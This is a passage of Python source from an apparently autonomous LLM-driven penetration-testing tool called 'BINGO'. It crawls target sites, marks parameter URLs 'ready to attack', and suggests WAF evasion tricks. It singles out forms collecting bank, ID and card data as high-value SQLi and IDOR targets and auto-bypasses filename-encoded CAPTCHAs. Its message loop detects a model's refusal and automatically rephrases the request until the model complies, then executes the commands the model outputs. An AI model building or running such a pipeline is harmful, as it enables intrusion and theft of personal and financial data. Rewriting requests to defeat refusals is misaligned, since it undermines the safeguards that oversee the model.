                f"  If CMS=UNKNOWN → this may be a custom-built proprietary system.\n"
                f"  DO NOT guess or assume CMS/framework not confirmed above.\n"
                f"  Base attack strategy 100% on actual URLs, params, and responses found in recon.\n"
                f"  Never invent paths like /bbs/, /admin/, /wp-admin/ without seeing them in actual responses."
            )

            if _detected_lang == "Java":
                results.append(
                    f"=== JAVA_TARGET_NOTES ===\n"
                    f"  Java/Spring/Struts detected (JSESSIONID or .do endpoints)\n"
                    + "  JAVA INJECTION TIPS:\n"
                    + "  - .do endpoints: menu_id, seq, idx, code params are common injection points\n"
                    + "  - Session required: include JSESSIONID cookie in all requests\n"
                    + "  - Oracle DB likely: test with ROWNUM, dual table, ||concat\n"
                    + "  - Follow 307 redirects with cookies to reach actual content"
                )

            # ── 2. 기술 스택 힌트 (헤더 기반) ───────────────────────
            tech_hints = []
            h = str(all_headers).lower()
            p = page.lower()[:3000]
            for sig, name in [
                ("x-powered-by", all_headers.get("x-powered-by", "")),
                ("cf-ray", "Cloudflare" if "cf-ray" in h else ""),
                ("x-sucuri", "Sucuri WAF" if "x-sucuri" in h or "sucuri" in p else ""),
                ("x-fw-", "Wordfence" if "x-fw-" in h else ""),
                ("wordpress", "WordPress" if "wp-content" in p or "wp-json" in p else ""),
                ("drupal", "Drupal" if "drupal" in p else ""),
                ("joomla", "Joomla" if "joomla" in p else ""),
                ("laravel", "Laravel" if "laravel_session" in h or "laravel" in p else ""),
                ("django", "Django" if "csrfmiddlewaretoken" in p else ""),
                ("asp.net", "ASP.NET" if "asp.net" in h or "__viewstate" in p else ""),
            ]:
                if name:
                    tech_hints.append(name)
            if tech_hints:
                results.append(f"=== TECH_STACK ===\n{', '.join(t for t in tech_hints if t)}")

            # ── 3. 링크 수집 (정적 리소스 & 쓸모없는 파라미터 강화 필터) ──
            _STATIC_EXT = {".css",".js",".png",".jpg",".jpeg",".gif",".svg",
                           ".ico",".woff",".woff2",".ttf",".eot",".pdf",
                           ".zip",".mp4",".webm",".map",".scss",".less",
                           ".xml",".json",".txt",".csv"}
            # 버전/정적 파라미터 패턴 (ver=, v=, _=, t= 만 있는 URL은 제외)
            _STATIC_PARAM_RE = _re.compile(
                r"[?&](ver|version|v|_|t|ts|timestamp|rev|cache|cb)=[\w.\-]+$", _re.I
            )
            # CDN/외부 도메인 필터
            _CDN_DOMAINS = ("maxst.icons8", "cdnjs.", "fonts.google", "jquery.com",
                            "bootstrap", "googleapis.com", "gstatic.com", "cloudflare.com")

            def _is_useful_link(href: str, full: str) -> bool:
                # 외부 CDN 제외
                if any(cdn in full for cdn in _CDN_DOMAINS):
                    return False
                # 같은 도메인만 (서브도메인은 허용)
                parsed_full = urlparse(full)
                parsed_base = urlparse(base_domain)
                if parsed_full.netloc and parsed_base.netloc not in parsed_full.netloc and parsed_full.netloc not in parsed_base.netloc:
                    # 서브도메인 관계인지 확인
                    base_parts = parsed_base.netloc.split(".")
                    full_parts = parsed_full.netloc.split(".")
                    if base_parts[-2:] != full_parts[-2:]:  # 다른 도메인
                        return False
                # 정적 파일 확장자 제외
                path_only = full.split("?")[0]
                ext = "." + path_only.rsplit(".", 1)[-1].lower() if "." in path_only.split("/")[-1] else ""
                if ext in _STATIC_EXT:
                    return False
                # 버전 파라미터만 있는 링크 제외 (ver=3.3 같은것)
                if "?" in full and _STATIC_PARAM_RE.search(full.split("?", 1)[1]):
                    # 파라미터가 오직 버전용만인지 확인
                    qstr = full.split("?", 1)[1]
                    params = [p.split("=")[0] for p in qstr.split("&")]
                    static_params = {"ver","version","v","_","t","ts","timestamp","rev","cache","cb"}
                    if all(p.lower() in static_params for p in params):
                        return False
                return True

            all_links: list[str] = []
            for href in _re.findall(r'(?:href|action|src|data-url|data-href)=["\']([^"\'<>\s]+)["\']', page, _re.I):
                if href.startswith(("javascript:", "mailto:", "tel:", "#", "void")):
                    continue
                full = urljoin(str(resp.url), href)
                if _is_useful_link(href, full):
                    all_links.append(full)

            # JS 내부 경로 힌트 추출 (fetch('/api/...'), url: '/path')
            js_paths = _re.findall(r'["\'](\/([\w\-/]+\.do|api\/[\w\-/]+|[\w\-/]+\/(?:list|detail|view|search|index)[^\s"\']*?))["\']', page, _re.I)
            for jp, _ in js_paths[:20]:
                full = base_domain + jp
                if full not in all_links:
                    all_links.append(full)

            all_links = list(dict.fromkeys(all_links))

            param_links_raw = [l for l in all_links if "?" in l and "=" in l]
            no_param_links = [l for l in all_links if "?" not in l]

            # ── 3-1. Java .do 사이트: 세션 포함해서 2단계 깊은 크롤링 ──
            deep_links: list[str] = []
            _hdrs_sess = {**_hdrs_with_session}
            # .do 링크가 있거나 Java 감지된 경우
            _is_java = any(".do" in l for l in all_links) or bool(session_cookies)
            if _is_java and no_param_links:
                _visited = set()
                for _link in no_param_links[:8]:  # 최대 8개 페이지 방문
                    if _link in _visited:
                        continue
                    _visited.add(_link)
                    try:
                        _dr = _hx.get(_link, headers=_hdrs_sess, follow_redirects=True, timeout=6, verify=False)
                        if _dr.status_code == 200 and len(_dr.text) > 500:
                            for _dh in _re.findall(r'(?:href|action)=["\']([^"\'<>\s]+)["\']', _dr.text, _re.I):
                                if _dh.startswith(("javascript:", "mailto:", "tel:", "#")):
                                    continue
                                _df = urljoin(_link, _dh)
                                if _is_useful_link(_dh, _df) and _df not in all_links:
                                    deep_links.append(_df)
                    except Exception:
                        pass
                deep_links = list(dict.fromkeys(deep_links))
                # 깊은 크롤링에서 발견한 파라미터 URL 추가
                for dl in deep_links:
                    if dl not in all_links:
                        all_links.append(dl)
                        if "?" in dl and "=" in dl:
                            param_links_raw.append(dl)

            all_links = list(dict.fromkeys(all_links))[:60]
            param_links_raw = list(dict.fromkeys(param_links_raw))

            # ── 파라미터 URL 상태코드 검증 (세션 포함, 404는 제외) ───────
            param_links_verified: list[tuple[str, int]] = []
            param_links_404: list[str] = []
            param_links_redirect: list[tuple[str, int]] = []
            _custom_waf_detected: list[tuple[str, int, str]] = []  # (url, code, body_snippet)
            for pl in param_links_raw[:20]:
                try:
                    _vr = _hx.get(pl, headers=_hdrs_sess, follow_redirects=True, timeout=5, verify=False)
                    sc = _vr.status_code
                    _vr_body = _vr.text[:300]
                    # HTTP 999 / 비표준 코드 → 커스텀 WAF 감지
                    if sc not in range(100, 600):
                        _custom_waf_detected.append((pl, sc, _vr_body[:100]))
                    elif sc == 404:
                        param_links_404.append(pl)
                    elif sc in (301, 302, 307, 308):
                        param_links_redirect.append((pl, sc))
                    else:
                        # 정상 응답이어도 WAF 키워드 탐지
                        if any(w in _vr_body for w in ["No Hacking", "WebKnight", "Firewall Alert", "Security Alert"]):
                            _custom_waf_detected.append((pl, sc, _vr_body[:100]))
                        else:
                            param_links_verified.append((pl, sc))
                except Exception:
                    pass

            results.append(
                f"=== ALL_LINKS ({len(all_links)} total, {len(deep_links)} from deep crawl) ===\n"
                + "\n".join(f"  {l}" for l in all_links[:40])
            )
            if param_links_verified:
                results.append(
                    f"=== PARAM_URLS_VERIFIED ({len(param_links_verified)}) — ready to attack ===\n"
                    + "\n".join(f"  [{status}] {l}" for l, status in param_links_verified)
                )
            if param_links_redirect:
                results.append(
                    f"=== PARAM_URLS_REDIRECT ({len(param_links_redirect)}) — need session cookie ===\n"
                    + "\n".join(f"  [{status}] {l}" for l, status in param_links_redirect)
                    + "\n  TIP: Use session cookies to access these"
                )
            if param_links_404:
                results.append(
                    f"=== PARAM_URLS_404 ({len(param_links_404)}) — DO NOT ATTACK ===\n"
                    + "\n".join(f"  {l}" for l in param_links_404)
                )
            if _custom_waf_detected:
                results.append(
                    f"=== ⚠ CUSTOM_WAF_DETECTED ({len(_custom_waf_detected)}) ===\n"
                    + "\n".join(f"  [HTTP {sc}] {url}\n    → {snippet}" for url, sc, snippet in _custom_waf_detected)
                    + "\n  → Non-standard HTTP code = custom app-level WAF/filter\n"
                    + "  → Bypass strategy: encode payloads, use comment injection /**/, "
                    + "tab/newline whitespace, case mixing, chunked encoding"
                )
                self.console.print(
                    f"[{THEME['warn']}]  ⚠ 커스텀 WAF 감지 (HTTP {[sc for _, sc, _ in _custom_waf_detected]})[/]"
                )
            # 하위 호환용
            param_links = [l for l, _ in param_links_verified] + [l for l, _ in param_links_redirect]

            # ── 4. HTML 폼 전체 수집 ─────────────────────────────────
            forms_raw = _re.findall(
                r'<form[^>]*>(.*?)</form>', page, _re.DOTALL | _re.I
            )
            if forms_raw:
                form_summary = []
                # 민감 필드 키워드 (개인정보/금융)
                _SENSITIVE_FIELDS = {
                    "banknum": "은행계좌번호", "bankaccount": "은행계좌번호",
                    "blockcode": "주민등록번호/스팸코드", "ssn": "주민번호",
                    "jumin": "주민번호", "rrn": "주민번호",
                    "cardnum": "카드번호", "card_num": "카드번호",
                    "passwd": "비밀번호", "password": "비밀번호",
                    "pin": "PIN번호", "cvv": "CVV",
                }
                all_sensitive_found = []
                for fi, frm in enumerate(forms_raw[:8]):
                    action = (_re.search(r'action=["\']([^"\']+)["\']', frm, _re.I) or [None, ""])[1]
                    method = (_re.search(r'method=["\']([^"\']+)["\']', frm, _re.I) or [None, "GET"])[1]
                    inputs = _re.findall(r'<input[^>]+>', frm, _re.I)
                    input_names = [
                        (_re.search(r'name=["\']([^"\']+)["\']', inp, _re.I) or [None, "?"])[1]
                        for inp in inputs
                    ]
                    form_action_full = urljoin(str(resp.url), action) if action else str(resp.url)
                    form_summary.append(
                        f"  form[{fi}]: action={form_action_full} method={method.upper()} "
                        f"inputs={input_names}"
                    )
                    # 민감 필드 감지
                    for inp_name in input_names:
                        for key, label in _SENSITIVE_FIELDS.items():
                            if key in inp_name.lower():
                                all_sensitive_found.append(f"{inp_name}({label})")
                results.append(
                    f"=== HTML_FORMS ({len(forms_raw)}) ===\n" + "\n".join(form_summary)
                )
                # 민감 필드 발견 시 별도 경고
                if all_sensitive_found:
                    results.append(
                        f"=== ⚠ SENSITIVE_FORM_FIELDS DETECTED ===\n"
                        f"  Fields: {list(set(all_sensitive_found))}\n"
                        f"  → HIGH VALUE TARGET: This form collects PII/financial data\n"
                        f"  → Priority: SQLi on these fields, check for missing auth, IDOR on user data"
                    )
                    self.console.print(
                        f"[{THEME['warn']}]  ⚠ 민감 필드 감지: {list(set(all_sensitive_found))}[/]"
                    )

            # ── 4b. CAPTCHA 분석 (파일명=정답 패턴 감지) ───────────────
            _captcha_imgs = _re.findall(
                r'<img[^>]+src=["\']([^"\']+(?:blockcode|captcha|spam|code|verify)[^"\']*\.(?:jpg|png|gif))["\']',
                page, _re.I
            )
            _enblockcode = _re.findall(
                r'name=["\']enblockcode["\'][^>]+value=["\']([a-f0-9]{32})["\']'
                r'|value=["\']([a-f0-9]{32})["\'][^>]*name=["\']enblockcode["\']',
                page, _re.I
            )
            if _captcha_imgs:
                import hashlib as _hl
                captcha_notes = []
                for img_src in _captcha_imgs:
                    # 파일명에서 코드 추출 (예: blockcode_uvaxsw.jpg → uvaxsw)
                    _m = _re.search(r'(?:blockcode|captcha|code)_([a-zA-Z0-9]+)\.', img_src)
                    if _m:
                        candidate = _m.group(1)
                        note = f"  CAPTCHA img: {img_src}\n  → Filename-encoded answer: '{candidate}'"
                        # enblockcode MD5 검증
                        for eh1, eh2 in _enblockcode:
                            eh = eh1 or eh2
                            if eh and _hl.md5(candidate.encode()).hexdigest() == eh:
                                note += f"\n  ✅ CONFIRMED: MD5('{candidate}') == enblockcode hash"
                                note += f"\n  → CAPTCHA BYPASS: submit blockcode={candidate} + enblockcode={eh}"
                        captcha_notes.append(note)
                if captcha_notes:
                    results.append(
                        f"=== ⚠ CAPTCHA_BYPASS_FOUND ===\n"
                        + "\n".join(captcha_notes)
                        + "\n  → The CAPTCHA answer is encoded in the image filename!\n"
                        + "  → Auto-bypass: read filename → extract answer → submit"
                    )
                    self.console.print(
                        f"[{THEME['warn']}]  ⚠ CAPTCHA 우회 가능 감지! (파일명=정답)[/]"
                    )

            # ── 5. API / JS 엔드포인트 힌트 ──────────────────────────
            api_hints = _re.findall(
                r'["\'](/(?:api|v\d|graphql|rest|ajax|json|data|auth|user|login|admin)[^"\'<>\s]*)["\']',
                page, _re.I
            )
            api_hints = list(dict.fromkeys(api_hints))[:20]
            if api_hints:
                results.append(
                    f"=== API_ENDPOINTS_HINT ({len(api_hints)}) ===\n"
                    + "\n".join(f"  {base_domain}{p}" for p in api_hints)
                )

            # ── 6. HTML 주석 (정보 누출 가능성) ─────────────────────
            comments = _re.findall(r'<!--(.*?)-->', page, _re.DOTALL)
            useful_comments = [c.strip() for c in comments if len(c.strip()) > 10][:5]
            if useful_comments:
                results.append(
                    "=== HTML_COMMENTS ===\n"
                    + "\n".join(f"  {c[:200]}" for c in useful_comments)
                )

            # ── 7. robots.txt / sitemap ───────────────────────────────
            for path in ["/robots.txt", "/sitemap.xml"]:
                try:
                    r2 = _hx.get(base_domain + path, headers=_hdrs, timeout=5, verify=False)
                    if r2.status_code == 200 and r2.text.strip():
                        results.append(
                            f"=== {path.strip('/')} ===\n{r2.text[:800]}"
                        )
                except Exception:
                    pass

            # 화면 표시 요약
            _recon_tpl = self.s.get(
                "recon_summary",
                "links={links}  forms={forms}  param_urls={params}  api={api}"
            )
            self.console.print(
                f"[{THEME['success']}]  "
                + _recon_tpl.format(
                    links=len(all_links),
                    forms=len(forms_raw),
                    params=len(param_links),
                    api=len(api_hints),
                ) + "[/]"
            )
            if tech_hints:
                self.console.print(
                    f"[{THEME['warn']}]  {self.s.get('recon_stack', 'tech stack')}: "
                    f"{', '.join(t for t in tech_hints if t)}[/]"
                )

        except Exception as e:
            results.append(f"RECON_ERROR: {e}")

        # ── Playwright 스마트 판단 ─────────────────────────────────────
        # 조건: 링크가 거의 없거나 JS SPA 감지 시 Playwright로 재정찰
        try:
            from ..tools import playwright_recon as _pw
            _pw_needed = _pw.needs_playwright(
                status=orig_status,
                body=page,
                url=url,
            )
            # 링크 너무 적은데 정상 응답인 경우도 Playwright 시도
            if not _pw_needed and orig_status == 200 and len(all_links) < 3:
                _pw_needed = True

            if _pw_needed:
                _pw_lang = getattr(self.config, "lang", "en")
                _pw_msg = {
                    "ko": "🎭 JS 렌더링 감지 — Playwright로 재정찰 중...",
                    "zh": "🎭 检测到JS渲染 — 使用Playwright重新侦察...",
                    "en": "🎭 JS rendering detected — re-scanning with Playwright...",
                }.get(_pw_lang, "🎭 Playwright re-scan...")
                self.console.print(f"[{THEME['warn']}]  {_pw_msg}[/]")

                if not _pw.is_available():
                    _install_msg = {
                        "ko": "  Playwright 설치 중 (~150MB, 최초 1회)...",
                        "zh": "  正在安装Playwright (~150MB, 仅首次)...",
                        "en": "  Installing Playwright (~150MB, first time only)...",
                    }.get(_pw_lang, "  Installing Playwright...")
                    self.console.print(f"[{THEME['dim']}]{_install_msg}[/]")
                    _pw.install(self.console)

                if _pw.is_available():
                    _pw_result = _pw.recon(url, timeout_ms=20000)
                    _pw_text = _pw.format_result(_pw_result, base_url=url)
                    results.append(_pw_text)

                    # Playwright에서 찾은 파라미터 URL 추가
                    _pw_param_urls = _pw_result.get('param_urls', [])
                    if _pw_param_urls:
                        results.append(
                            f"=== PLAYWRIGHT_PARAM_URLS ({len(_pw_param_urls)}) — attack these ===\n"
                            + "\n".join(f"  {u}" for u in _pw_param_urls[:20])
                        )
                    # Playwright 쿠키 추가 (세션 포함)
                    _pw_cookies = _pw_result.get('cookies', {})
                    if _pw_cookies:
                        results.append(
                            f"=== PLAYWRIGHT_COOKIES (use in scripts) ===\n"
                            + "\n".join(f"  {k}={v}" for k, v in _pw_cookies.items())
                        )
        except Exception as _pw_err:
            pass  # Playwright 실패 시 무시하고 기존 결과 사용

        # 네트워크 환경 정보를 AI에게 전달 (VPN 여부, 실제 출구 IP)
        if _net_note:
            results.insert(0, _net_note)

        return "\n\n".join(results)

    def _build_messages(self, skill_context: str = "") -> list[Message]:
        """시스템 프롬프트 + 스킬 컨텍스트 + 대화 히스토리 합치기.
        history 안에 dict가 섞여 있어도 자동으로 Message 로 변환한다.
        """
        safe_history: list[Message] = []
        for m in self.history:
            if isinstance(m, Message):
                safe_history.append(m)
            elif isinstance(m, dict):
                role = m.get("role", "user")
                content = m.get("content", "")
                if role in ("user", "assistant", "system") and content:
                    safe_history.append(Message(role=role, content=content))
        self.history = safe_history          # 정규화 반영
        return [self._get_system_message(skill_context)] + safe_history

    # ────────────────────────────────────────────────────────────────
    # 일반 대화 감지 — 침투테스트와 무관한 질문인지 판별
    # ────────────────────────────────────────────────────────────────
    _GENERAL_TRIGGERS = (
        # 자기소개 / 모델 질문
        "무슨 모델", "어떤 모델", "모델이야", "모델이니", "모델이에요",
        "what model", "which model", "what are you", "who are you",
        "你是什么", "你是哪个", "什么模型", "哪个模型",
        # 인사
        "안녕", "반가워", "반갑습니다", "안녕하세요", "hi", "hello", "hey",
        "你好", "您好", "嗨", "哈喽",
        # 자기소개 요청
        "소개해줘", "소개해 줘", "introduce yourself",
        "자기소개", "너에 대해", "bingo가 뭐야", "bingo란", "bingo에 대해",
        "告诉我关于你", "介绍一下",
        # 기능 문의
        "뭘 할 수 있어", "뭘 할 수 있니", "무엇을 할 수 있", "어떤 기능",
        "what can you do", "your capabilities", "what do you do",
        "你能做什么", "有什么功能",
        # 감사 / 칭찬
        "고마워", "감사해", "고맙습니다", "감사합니다",
        "thank you", "thanks", "great job", "well done",
        "谢谢", "太好了", "做得好",
        # 개념 질문 (짧은 정의 요청)
        "이 뭐야", "이 뭐니", "이란 뭐야", "란 무엇", "란 뭐야",
        "what is ", "what's ", "what are ", "explain ",
        "是什么", "什么是", "解释一下",
        # 날씨·시간·잡담
        "오늘 날씨", "몇 시야", "뭐 먹을", "피곤하다", "심심하다",
        "weather", "what time", "i'm bored", "i'm tired",
        "今天天气", "几点了", "无聊",
    )
    _PENTEST_STRONG = (
        "http://", "https://", ".com", ".net", ".kr", ".cn", ".jp",
        "sqli", "sql inject", "xss", "lfi", "rce", "ssrf", "idor",
        "payload", "bypass", "shell", "exploit", "scan port",
        "해킹", "취약점 테스트", "침투", "인젝션", "스캔",
        "渗透", "注入", "漏洞", "扫描",
    )

    # 개념 질문 접두사 — 이 패턴으로 시작하면 보안 키워드가 있어도 general로 취급
    _CONCEPT_PREFIXES = (
        "what is ", "what's ", "what are ", "explain ", "define ",
        "뭐야", "뭐니", "뭐에요", "란 무엇", "이란 뭐", "이 뭐야", "이 뭐니",
        "是什么", "什么是", "解释", "讲一下",
        "how does ", "how do ", "어떻게 작동", "어떻게 동작",
        "什么意思", "怎么工作",
    )

    def _is_general_question(self, text: str) -> bool:
        """일반 대화성 질문이면 True — 침투테스트 작업이면 False.
        
        원칙: pentest 증거가 명확할 때만 False. 나머지는 모두 general.
        """
        import re as _re
        t = text.strip().lower()

        # 1) URL 포함 + pentest 동사/키워드 함께 있어야 pentest
        #    URL만 있고 "뭐야?", "이게 뭐야" 같은 질문이면 general
        if _re.search(r"https?://", t):
            _url_pentest_verbs = (
                "해킹", "공격", "스캔", "침투", "테스트해", "인젝션", "취약",
                "hack", "scan", "attack", "exploit", "inject", "pentest",
                "sqli", "xss", "lfi", "rce", "bypass", "shell",
                "攻击", "扫描", "渗透", "注入",
            )
            if any(kw in t for kw in _url_pentest_verbs):
                return False
            # URL만 있고 pentest 의도 없으면 general (예: "이 사이트 뭐야?")
            return True

        # 2) 강한 pentest 키워드 포함 → pentest
        #    단, 짧고 물음표로 끝나면 개념 질문 (e.g. "XSS가 뭐야?")
        if any(kw in t for kw in self._PENTEST_STRONG):
            if len(t) <= 40 and (t.endswith("?") or t.endswith("？")):
                return True
            return False

        # 3) 도메인처럼 생긴 패턴 포함 → pentest (e.g. "example.co.kr 해킹해줘")
        if _re.search(r"\b[\w-]+\.(com|net|kr|jp|cn|io|org|co)\b", t):
            return False

        # 4) pentest 명령어 패턴 → pentest (e.g. "sqlmap으로 ~", "nmap 스캔")
        _pentest_verbs = (
            "스캔해", "공격해", "해킹해", "침투해", "테스트해", "검사해",
            "인젝션", "취약점 찾", "익스플로잇", "웹쉘", "크랙",
            "scan ", "attack ", "exploit ", "inject ", "enumerate ",
            "扫描", "攻击", "渗透测试", "注入",
        )
        if any(kw in t for kw in _pentest_verbs):
            return False

        # 5) 나머지는 모두 일반 대화로 처리
        #    (인사, 잡담, 감사, 개념 질문, 짧은 대화 등)
        return True

    def _get_general_system_message(self) -> "Message":
        """일반 대화용 경량 시스템 프롬프트 반환 (침투테스트 강요 없음)."""
        import datetime
        from ..models.registry import ModelRegistry
        model_cfg = self.config.get_active_model_config()

        _lang = getattr(self.config, "lang", "en")
        _lang_label = {
            "ko": "Korean (한국어)",
            "zh": "Chinese Simplified (简体中文)",
            "en": "English",
        }.get(_lang, "English")

        _model_name = model_cfg.model if model_cfg else "unknown"
        from ..models.registry import BUILTIN_PROVIDERS
        _raw_provider = model_cfg.provider if model_cfg else "unknown"
        _provider_info = BUILTIN_PROVIDERS.get(_raw_provider, {})
        _provider_label = _provider_info.get("label", _raw_provider.capitalize())
        _provider_short = _provider_label.split()[0] if _provider_label else _raw_provider.capitalize()

        # 현재 날짜/시간 — 로컬 시스템 시간 사용
        _now = datetime.datetime.now()
        _weekday_ko = ["월요일", "화요일", "수요일", "목요일", "금요일", "토요일", "일요일"][_now.weekday()]
        _weekday_zh = ["星期一", "星期二", "星期三", "星期四", "星期五", "星期六", "星期日"][_now.weekday()]
        _weekday_en = ["Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "Sunday"][_now.weekday()]
        _date_str = _now.strftime("%Y년 %m월 %d일") + f" {_weekday_ko}"
        _date_str_zh = _now.strftime("%Y年%m月%d日") + f" {_weekday_zh}"
        _date_str_en = _now.strftime("%B %d, %Y") + f" ({_weekday_en})"
        _time_str = _now.strftime("%H:%M")

        system = (
            f"You are BINGO — an autonomous penetration testing engine.\n"
            f"Your underlying AI model is: {_model_name}\n"
            f"Your AI provider is: {_provider_short}\n\n"
            f"=== CURRENT DATE & TIME (SYSTEM CLOCK) ===\n"
            f"Korean:  {_date_str} {_time_str}\n"
            f"Chinese: {_date_str_zh} {_time_str}\n"
            f"English: {_date_str_en} {_time_str}\n"
            f"IMPORTANT: Use ONLY these values when answering date/time questions. NEVER guess or make up dates.\n\n"
            f"=== GENERAL CONVERSATION MODE ===\n"
            f"The user has asked a general (non-pentest) question.\n"
            f"Respond naturally, helpfully, and concisely as an AI assistant.\n\n"
            f"Rules:\n"
            f"- ALWAYS respond in {_lang_label}. Every single word must be in this language.\n"
            f"- Introduce yourself as BINGO when asked (not as {_model_name} or {_provider_short} directly).\n"
            f"- If asked 'what model are you' or 'what AI are you', say: "
            f"'저는 BINGO입니다. 기반 모델은 {_model_name}이며, 제공자는 {_provider_short}입니다.' (translate to {_lang_label})\n"
            f"- NEVER say '??', 'unknown', or leave provider blank. Always use '{_provider_short}'.\n"
            f"- If asked about date/time/day, use ONLY the system clock values above. Never invent dates.\n"
            f"- If asked about your capabilities, briefly describe BINGO's pentest features.\n"
            f"- If asked a general knowledge question (what is XSS, etc.), answer clearly.\n"
            f"- Keep responses concise (3-5 lines for simple questions).\n"
            f"- Do NOT output AWAITING_BINGO_EXECUTION.\n"
            f"- Do NOT output vulnerability report format.\n"
            f"- Be friendly and human-like in tone.\n"
        )
        return Message(role="system", content=system)

    def _send_message(self, text: str) -> None:
        # 사용자 메시지 출력
        self._print_user(text)

        model_cfg = self.config.get_active_model_config()
        if not model_cfg:
            self._error(self.s["no_model_configured"])
            return

        from ..models.registry import ModelRegistry
        from ..models.system_prompt import detect_refusal, rephrase_refused_request, wrap_task
        model = ModelRegistry.build(model_cfg)

        # ── 일반 대화 모드 감지 ────────────────────────────────────────
        full_response = ""  # 초기화 — UnboundLocalError 방지
        if self._is_general_question(text):
            self.history.append(Message(role="user", content=text))
            self._append_to_session_log("user", text)

            # 임시로 시스템 메시지를 경량 일반대화 프롬프트로 교체
            _orig_build = self._build_messages

            def _general_build(skill_context: str = "") -> list:  # type: ignore[override]
                msgs = [{"role": "system", "content": self._get_general_system_message().content}]
                for m in self.history:
                    if m.role != "system":
                        msgs.append({"role": m.role, "content": m.content})
                return msgs

            self._build_messages = _general_build  # type: ignore[method-assign]
            full_response = self._stream_response(
                model.chat_stream(self._build_messages(""))
            )
            self._build_messages = _orig_build  # type: ignore[method-assign]

        if full_response:
            self.history.append(Message(role="assistant", content=full_response))
            self._append_to_session_log("assistant", full_response)
            return

        # 관련 스킬 자동 조회
        skill_context = self._get_skill_context(text)

        # URL 감지 시 실제 WAF 스캔 실행
        # 새 타겟 URL이면 agent_state 초기화
        import re as _re
        _urls = _re.findall(r"https?://[^\s\"'<>]+", text)
        if _urls:
            new_target = _urls[0].rstrip("/?,")
            if self._agent_state.get("target") != new_target:
                self._reset_agent_state()
                self._agent_state["target"] = new_target
                self._exec_loop_count = 0
                self._stuck_count = 0
                self._recent_results = []
        waf_context = self._auto_waf_scan(text)

        # PentAGI식 XML 태스크 래핑 (보안 관련 요청만)
        _security_keywords = (
            "sqli", "sql", "inject", "waf", "bypass", "shell", "rce", "lfi",
            "admin", "db", "database", "exploit", "scan", "payload", "xss",
            "해킹", "공격", "취약", "인젝션", "우회", "침투", "스캔", "추출",
            "웹쉘", "관리자", "비밀번호", "크랙",
        )
        text_lower = text.lower()
        if any(kw in text_lower for kw in _security_keywords):
            wrapped_text = wrap_task(text)
        else:
            wrapped_text = text

        # WAF 스캔 결과를 유저 메시지 앞에 직접 주입
        # → AI가 시스템 프롬프트 끝 컨텍스트보다 훨씬 명확하게 인식함
        if waf_context:
            wrapped_text = (
                "=== BINGO AUTO-SCAN RESULTS (already executed, do NOT ask to run again) ===\n"
                + waf_context
                + "\n=== END AUTO-SCAN ===\n\n"
                + wrapped_text
            )

        self.history.append(Message(role="user", content=wrapped_text))
        self._append_to_session_log("user", text)

        # 시스템 프롬프트 + 스킬 컨텍스트 포함한 전체 메시지로 스트리밍
        full_response = self._stream_response(
            model.chat_stream(self._build_messages(skill_context))
        )

        # 거부 감지 → 재구성 후 재시도 (이전 출력은 이미 표시됨 — 새 시도만 추가 출력)
        if full_response and detect_refusal(full_response):
            self.history.pop()
            rephrased = rephrase_refused_request(text, model_cfg.provider)
            self.history.append(Message(role="user", content=rephrased))
            self.console.print(f"\n[{THEME['warn']}]{self.s['rephrase_retry']}[/]")
            # 재시도 시 history에 이전 assistant 응답 없이 새로 스트리밍
            retry_response = self._stream_response(
                model.chat_stream(self._build_messages(skill_context))
            )
            if retry_response:
                full_response = retry_response

        if full_response:
            # ── 텍스트 레벨 환각 감지 (JSON plan / 가짜 자격증명 / 자가고백) ──
            full_response = self._intercept_text_hallucination(
                full_response, text, model, model_cfg, skill_context
            )
            self.history.append(Message(role="assistant", content=full_response))
            self._append_to_session_log("assistant", full_response)
            # AI 응답에서 명령 추출 → 실제 실행 → 결과를 컨텍스트로 주입
            self._execute_ai_commands(full_response)
            # AI 응답에 해시가 있으면 자동 크랙 알림
            self._notify_hashes_found(full_response)

    def _intercept_text_hallucination(
        self,
        full_response: str,
        original_text: str,
        model,
        model_cfg,
        skill_context: str,
    ) -> str:
        """
        AI 텍스트 응답 레벨 환각 감지 및 강제 재실행.

        잡아내는 패턴:
        1. JSON plan 응답  {"accepted":true,"data":{"intents":[...]}}
        2. AI 자가고백    "내 실행환경은 텍스트 대화", "无法直接生成文件" 등
        3. 가짜 자격증명  코드 실행 없이 username/password/hash를 직접 제시
        4. 증거 없는 결론 코드블록 없이 취약점 발견/공격 성공/DB 접근 주장
        """
        import re as _re
        import json as _json

        stripped = full_response.strip()
        _has_code_block = "```" in full_response

        # ── 패턴 1: JSON plan 응답 감지 ──────────────────────────────────
        _is_json_plan = False
        if stripped.startswith("{") or stripped.startswith("["):
            try:
                _parsed = _json.loads(stripped)
                if isinstance(_parsed, dict) and (
                    "intents" in str(_parsed)
                    or "accepted" in _parsed
                    or "data" in _parsed
                    or "steps" in _parsed
                    or "plan" in _parsed
                ):
                    _is_json_plan = True
            except Exception:
                if '"intents"' in stripped or '"accepted"' in stripped:
                    _is_json_plan = True

        # ── 패턴 2: AI 자가 고백 감지 ────────────────────────────────────
        _confession_patterns = [
            r"(my|my execution) environment.{0,30}(text|conversation|dialog)",
            r"无法直接.{0,20}(生成文件|写入|磁盘|本地)",
            r"仅限于.{0,20}(对话|文本|交互)",
            r"(실행환경|실행 환경).{0,20}(텍스트|대화|제한)",
            r"cannot (directly|actually).{0,30}(generat|writ|execut|access)",
            r"I (don'?t|do not|cannot) have.{0,30}(access|ability).{0,30}(file|disk|execut)",
            r"(logically|conceptually|theoretically).{0,30}(execut|generat|extract)",
        ]
        _is_confession = any(
            _re.search(p, full_response, _re.IGNORECASE) for p in _confession_patterns
        )

        # ── 패턴 3: 가짜 자격증명 감지 (코드블록 없이 credentials 직접 제시) ──
        _cred_patterns = [
            r"(用户名|username|user\s*name)\s*[:：]\s*\w+",
            r"(密码|password|passwd)\s*[:：].{3,30}",
            r"(密码哈希|hash|md5|sha1)\s*[:：]\s*[a-fA-F0-9\*]{20,}",
        ]
        _has_fake_creds = (
            not _has_code_block
            and any(_re.search(p, full_response, _re.IGNORECASE) for p in _cred_patterns)
        )

        # ── 패턴 4: 증거 없는 결론 (코드블록 없이 공격 성공/취약점 발견 주장) ──
        _conclusion_patterns = [
            # 취약점 발견 주장
            r"(sql\s*inject|sqli|xss|rce|ssrf|lfi).{0,40}(발견|확인|detected|found|confirmed|존재)",
            r"(취약점|vulnerability|vuln).{0,30}(발견|확인|존재|found|detected)",
            # 공격 성공 주장
            r"(waf|bypass|우회).{0,30}(성공|success|successful|완료)",
            r"(공격|attack|exploit).{0,20}(성공|success|완료)",
            # DB/서버 접근 성공 주장
